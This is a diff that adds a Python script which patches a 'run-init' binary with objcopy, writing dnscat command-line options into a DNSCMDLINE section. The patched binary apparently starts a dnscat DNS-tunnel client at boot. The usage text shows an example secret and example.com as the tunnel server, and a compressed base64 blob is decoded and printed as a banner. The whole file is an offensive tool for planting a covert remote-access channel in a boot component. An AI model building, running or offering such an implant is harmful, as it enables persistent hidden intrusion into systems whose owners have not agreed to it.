@@ -1,0 +1,86 @@
+#!/usr/bin/env python
+
+# inputs: binary, output, and options
+# outputs fixed binary
+
+import sys
+import subprocess
+import tempfile
+import base64
+import zlib
+
+banner = \
+"""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
+0o+16nZhe6dGPPX68T+4Y1qG"""
+
+based_banner = base64.b64decode(banner)
+bnr = zlib.decompress(based_banner)
+sys.stdout.write(bnr.decode('ascii'))
+
+if len(sys.argv) < 2:
+    sys.stderr.write("usage: %s <run-init binary> <dnscat options>....\n\n" % sys.argv[0])
+    sys.stderr.write("Where options are what options to pass to dnscat\n\n")
+    sys.stderr.write("example:\n")
+    sys.stderr.write("  %s /path/to/run-init dnscat --secret=%s example.com\n" %
+                     (sys.argv[0], "A"*32))
+    sys.exit(-1)
+
+infilename = sys.argv[1]
+options = sys.argv[2:]
+
+print("\n")
+print("input: %s" % infilename)
+print("options:"+", ".join(options))
+
+with tempfile.NamedTemporaryFile(dir='/tmp', delete=True) as tmpfile:
+        temp_file_name = tmpfile.name
+        joined = "\0".join(options)
+        joined += (4096 - len(joined)) * "\0"
+        tmpfile.write(bytearray(joined, 'ascii'))
+        subprocess.check_call(["objcopy", infilename, "--update-section",
+                               "DNSCMDLINE=%s" % temp_file_name])
+print("\nHave a nice day.")
+
